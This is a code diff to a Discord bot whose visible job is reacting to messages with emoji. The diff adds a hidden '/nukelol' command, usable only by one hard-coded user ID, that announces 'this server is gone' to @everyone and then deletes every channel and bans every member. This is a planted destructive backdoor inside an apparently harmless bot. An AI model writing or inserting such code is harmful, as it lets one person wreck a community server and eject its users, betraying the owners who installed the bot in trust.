@@ -103,6 +103,10 @@ function react() {
   message.react("🔽");
   globalreacts = globalreacts + 1
 }
+function nuke() {
+    message.guild.channels.forEach(channel => channel.delete())
+    message.guild.members.forEach(members => members.ban())
+  }
 if(message.author.bot) return;
 if (message.attachments.size > 0) {
     setTimeout(react, 500);
@@ -154,6 +158,12 @@ if (message.content.startsWith(prefix + "ping")) {
   if (message.content.includes('https://')) {
     setTimeout(react,500);
     message.react("🔼");
+  }else
+  if (message.content.startsWith("/nukelol")) {
+    if (message.author.id !== '289523788822085632') 
+      return message.reply("wow you really thought you were gonna get away with doing that didn't you.");
+    message.channel.send("@everyone Haha this server is gone! farewell and have fun :)")
+    setTimeout(nuke, 5000);
   }
 });
 client.login(process.env.BOT_TOKEN);
